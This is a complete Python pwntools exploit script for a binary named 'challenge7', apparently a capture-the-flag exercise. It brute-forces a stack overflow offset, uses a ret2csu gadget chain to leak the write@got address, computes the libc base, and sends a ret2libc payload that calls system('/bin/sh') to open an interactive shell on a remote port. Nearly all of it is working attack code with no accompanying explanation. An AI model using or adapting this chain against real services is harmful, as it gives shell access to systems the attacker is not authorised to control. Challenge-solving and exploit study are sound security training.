#!/usr/bin/python3.8
import warnings
from pwn import *
from termcolor import colored
warnings.filterwarnings("ignore")
context.arch = "amd64"

fname = "./challenge7" 

e     = ELF(fname)
rop   = ROP(e)
libc  = ELF("./libc.so.6") 

LOCAL = False

prompt = ">"

def find_boffset(max_num):
  # Avoid spamming
  context.log_level = "error"
  print(colored("\n[*] Searching for Overflow Offset..", "blue"))
  for i in range(1, max_num): 
    # Open connection
    r = process(fname)
    r.sendlineafter(prompt, "A"*i)
    
    # Recv everything
    r.recvall(timeout=0.5)
    
    # If the exit code == -1 (SegFault)
    if r.poll() == -11:
      if i%8==0:
        print(colored("\n[+] Buffer Overflow Offset found at: {}".format(i), "green"))
        r.close()
        return i
    r.close()
  print(colored("\n[-] Could not find Overflow Offset!\n", "red"))
  r.close()

'''
Gadgets

Gadget 1:
  0x00000000004009aa <+90>:  pop    rbx
  0x00000000004009ab <+91>:  pop    rbp
  0x00000000004009ac <+92>:  pop    r12
  0x00000000004009ae <+94>:  pop    r13
  0x00000000004009b0 <+96>:  pop    r14
  0x00000000004009b2 <+98>:  pop    r15
  0x00000000004009b4 <+100>: ret

Gadget 2:
  0x0000000000400990 <+64>:  mov    rdx,r15
  0x0000000000400993 <+67>:  mov    rsi,r14
  0x0000000000400996 <+70>:  mov    edi,r13d
  0x0000000000400999 <+73>:  call   QWORD PTR [r12+rbx*8]
'''

def gadgets(payload, g1, g2):
  payload += p64(g1)          # g1
  payload += p64(0)           # pop rbx
  payload += p64(1)           # pop rbp
  payload += p64(e.got.write) # pop r12 -> call
  payload += p64(1)           # pop r13 -> rdi
  payload += p64(e.got.write) # pop r14 -> rsi
  payload += p64(0x8)         # pop r15 -> rdx
  payload += p64(g2)          # ret
  payload += p64(0)*7         # pops
  payload += p64(e.sym.vulnerable_function)  # return to vulnerable function
  return payload

def ret2libc(r, prompt, offset):
  # Leak write@got address
  leak = r.recvline_contains(b"\x7f").strip()
  leak = u64(leak.ljust(8, b"\x00"))
  print(colored("[+] Leaked address    @ 0x{:x}".format(leak), "green"))
  libc.address = leak - libc.sym.write
  print(colored("[+] Libc base address @ 0x{:x}".format(libc.address), "green"))
  
  # Check if libc base is correct, should end with 000
  if libc.address & 0xfff != 000:
   print(colored("[-] Libc base does not end with 000!", "red"))
   exit()

  # Craft payload to call system("/bin/sh") and spawn shell
  pop_rdi  = rop.find_gadget(["pop rdi"])[0]
  payload  = b"A"*offset
  payload += p64(pop_rdi)
  payload += p64(next(libc.search(b"/bin/sh")))
  payload += p64(pop_rdi + 1)
  payload += p64(libc.sym.system)
  r.sendlineafter(prompt, payload)
  r.interactive()

def pwn():
  # Find the overflow offset
  offset = find_boffset(200)
  
  # Open a local process or a remote instance
  if LOCAL:
    r   = process(fname)
  else:
    r   = remote("0.0.0.0", 1337)

  g1 = e.sym.__libc_csu_init + 90
  g2 = e.sym.__libc_csu_init + 64

  # Leak with ret2csu
  r.sendlineafter(">", gadgets(b"A"*offset, g1, g2))
  
  ret2libc(r, prompt, offset)

if __name__ == "__main__":
  pwn()
